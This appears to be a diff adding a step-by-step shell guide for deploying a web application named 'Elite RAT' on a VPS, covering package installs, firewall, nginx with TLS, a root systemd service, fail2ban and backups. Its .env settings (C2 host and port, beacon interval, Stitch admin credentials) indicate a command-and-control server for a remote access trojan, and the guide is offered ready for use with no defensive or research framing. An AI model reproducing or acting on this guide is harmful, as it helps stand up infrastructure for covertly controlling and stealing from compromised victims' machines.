@@ -1,0 +1,256 @@
+################################################################################
+# ULTRA-SIMPLE COPY-PASTE DEPLOYMENT
+# Copy each section, paste into VPS terminal, wait for completion
+################################################################################
+
+# ============ BEFORE STARTING - ON YOUR LOCAL COMPUTER ============
+ssh-keygen -t ed25519 -C "your@email.com"
+cat ~/.ssh/id_ed25519.pub
+# ^ Add this key to GitHub: Settings > SSH and GPG keys > New SSH key
+
+ssh -T git@github.com
+# ^ Should say "Hi username! You've successfully authenticated"
+
+# NOW CONNECT TO YOUR VPS:
+ssh root@YOUR_VPS_IP
+
+
+# ============ SECTION 1: UPDATE & INSTALL ============
+sudo apt update && sudo apt upgrade -y
+sudo apt install -y build-essential wget curl git vim ufw fail2ban python3 python3-pip python3-venv python3-dev libpq-dev libjpeg-dev zlib1g-dev libffi-dev libssl-dev libsqlite3-dev nginx certbot python3-certbot-nginx htop
+
+
+# ============ SECTION 2: FIREWALL ============
+sudo ufw allow 22/tcp
+sudo ufw allow 80/tcp
+sudo ufw allow 443/tcp
+sudo ufw allow 5000/tcp
+sudo ufw --force enable
+sudo ufw status
+
+
+# ============ SECTION 3: CLONE REPOSITORY ============
+sudo mkdir -p /opt/elite-rat
+sudo chown -R $USER:$USER /opt/elite-rat
+cd /opt/elite-rat
+git clone git@github.com:YOUR_USERNAME/YOUR_REPO.git .
+# ^ REPLACE YOUR_USERNAME/YOUR_REPO with your actual GitHub repository
+ls -la
+
+
+# ============ SECTION 4: PYTHON SETUP ============
+cd /opt/elite-rat
+python3 -m venv venv
+source venv/bin/activate
+pip install --upgrade pip setuptools wheel
+pip install -r requirements.txt
+pip install gunicorn python-dotenv gevent gevent-websocket
+
+
+# ============ SECTION 5: CREATE DIRECTORIES ============
+mkdir -p /opt/elite-rat/{data,logs,keys,generated,ssl}
+
+
+# ============ SECTION 6: GENERATE KEYS (SAVE THESE!) ============
+echo "SECRET_KEY: $(openssl rand -hex 32)"
+echo "ENCRYPTION_KEY: $(openssl rand -hex 32)"
+# ^ COPY THESE! You'll need them in next section
+
+
+# ============ SECTION 7: CREATE .ENV FILE ============
+nano /opt/elite-rat/.env
+# Paste this, then CUSTOMIZE:
+
+FLASK_APP=web_app_real.py
+FLASK_ENV=production
+FLASK_DEBUG=false
+ELITE_C2_HOST=your-domain.com
+ELITE_C2_PORT=443
+ELITE_C2_PROTOCOL=https
+STITCH_ADMIN_USER=admin
+STITCH_ADMIN_PASSWORD=YourStrongPassword123!
+STITCH_SECRET_KEY=PASTE_YOUR_SECRET_KEY_HERE
+ELITE_ENCRYPTION_KEY=PASTE_YOUR_ENCRYPTION_KEY_HERE
+DATABASE_PATH=/opt/elite-rat/data/elite.db
+ELITE_BEACON_INTERVAL=60
+
+# Save: Ctrl+X, Y, Enter
+
+
+# ============ SECTION 8: SSL CERTIFICATE ============
+# Option A: Real domain with Let's Encrypt
+sudo certbot certonly --standalone -d your-domain.com -d www.your-domain.com
+
+# Option B: Self-signed for testing
+sudo openssl req -x509 -nodes -days 365 -newkey rsa:4096 -keyout /opt/elite-rat/ssl/key.pem -out /opt/elite-rat/ssl/cert.pem -subj "/C=US/ST=State/L=City/O=Org/CN=your-domain.com"
+sudo chown -R $USER:$USER /opt/elite-rat/ssl
+
+
+# ============ SECTION 9: NGINX CONFIG ============
+sudo nano /etc/nginx/sites-available/elite-rat
+# Paste this, then CUSTOMIZE server_name and ssl_certificate paths:
+
+upstream flask_app {
+    server 127.0.0.1:5000;
+}
+
+server {
+    listen 80;
+    server_name your-domain.com www.your-domain.com;
+    return 301 https://$server_name$request_uri;
+}
+
+server {
+    listen 443 ssl http2;
+    server_name your-domain.com www.your-domain.com;
+    
+    ssl_certificate /etc/letsencrypt/live/your-domain.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/your-domain.com/privkey.pem;
+    
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_ciphers HIGH:!aNULL:!MD5;
+    client_max_body_size 100M;
+
+    location / {
+        proxy_pass http://flask_app;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "upgrade";
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+    }
+
+    location /socket.io/ {
+        proxy_pass http://flask_app/socket.io/;
+        proxy_http_version 1.1;
+        proxy_buffering off;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "Upgrade";
+        proxy_set_header Host $host;
+    }
+}
+
+# Save: Ctrl+X, Y, Enter
+
+
+# ============ SECTION 10: ENABLE NGINX ============
+sudo ln -s /etc/nginx/sites-available/elite-rat /etc/nginx/sites-enabled/
+sudo rm -f /etc/nginx/sites-enabled/default
+sudo nginx -t
+sudo systemctl restart nginx
+sudo systemctl enable nginx
+
+
+# ============ SECTION 11: SYSTEMD SERVICE ============
+sudo nano /etc/systemd/system/elite-rat.service
+# Paste this:
+
+[Unit]
+Description=Elite RAT Web Application
+After=network.target
+
+[Service]
+Type=simple
+User=root
+Group=root
+WorkingDirectory=/opt/elite-rat
+Environment="PATH=/opt/elite-rat/venv/bin"
+Environment="FLASK_ENV=production"
+EnvironmentFile=/opt/elite-rat/.env
+
+ExecStart=/opt/elite-rat/venv/bin/gunicorn \
+    --bind 127.0.0.1:5000 \
+    --workers 4 \
+    --worker-class gevent \
+    --timeout 300 \
+    --access-logfile /opt/elite-rat/logs/access.log \
+    --error-logfile /opt/elite-rat/logs/error.log \
+    --log-level info \
+    web_app_real:app
+
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
+
+# Save: Ctrl+X, Y, Enter
+
+
+# ============ SECTION 12: START SERVICE ============
+sudo systemctl daemon-reload
+sudo systemctl enable elite-rat
+sudo systemctl start elite-rat
+sudo systemctl status elite-rat
+
+
+# ============ SECTION 13: FAIL2BAN ============
+sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
+sudo systemctl enable fail2ban
+sudo systemctl start fail2ban
+
+
+# ============ SECTION 14: BACKUPS ============
+sudo mkdir -p /opt/backups
+cat > /opt/elite-rat/backup.sh << 'EOF'
+#!/bin/bash
+tar -czf /opt/backups/backup-$(date +%Y%m%d_%H%M%S).tar.gz /opt/elite-rat/data /opt/elite-rat/.env
+ls -t /opt/backups/backup-*.tar.gz | tail -n +8 | xargs rm -f
+EOF
+chmod +x /opt/elite-rat/backup.sh
+(crontab -l 2>/dev/null; echo "0 2 * * * /opt/elite-rat/backup.sh") | crontab -
+
+
+# ============ SECTION 15: VERIFY ============
+sudo systemctl status elite-rat nginx
+sudo netstat -tulpn | grep -E '(80|443|5000)'
+curl -I http://localhost:5000
+curl -I https://your-domain.com
+
+
+# ============ SECTION 16: FINAL CLEANUP ============
+sudo ufw delete allow 5000/tcp
+sudo ufw reload
+
+
+################################################################################
+# DONE! Access your app at: https://your-domain.com
+# Login: admin / (password from .env file)
+################################################################################
+
+
+# ============ QUICK REFERENCE COMMANDS ============
+# View logs:
+sudo journalctl -u elite-rat -f
+
+# Restart app:
+sudo systemctl restart elite-rat
+
+# Restart nginx:
+sudo systemctl restart nginx
+
+# Update from GitHub:
+cd /opt/elite-rat && git pull && source venv/bin/activate && pip install -r requirements.txt --upgrade && sudo systemctl restart elite-rat
+
+
+# ============ TROUBLESHOOTING ============
+# App won't start:
+sudo journalctl -u elite-rat -n 100
+
+# Port in use:
+sudo lsof -i :5000
+sudo pkill -f gunicorn
+sudo systemctl restart elite-rat
+
+# Can't access:
+sudo ufw status
+sudo systemctl status nginx
+sudo nginx -t
+
+
+################################################################################
+# IMPORTANT: Also configure IONOS Cloud Panel Firewall!
+# Login to IONOS → VPS → Firewall → Allow ports 22, 80, 443
+################################################################################
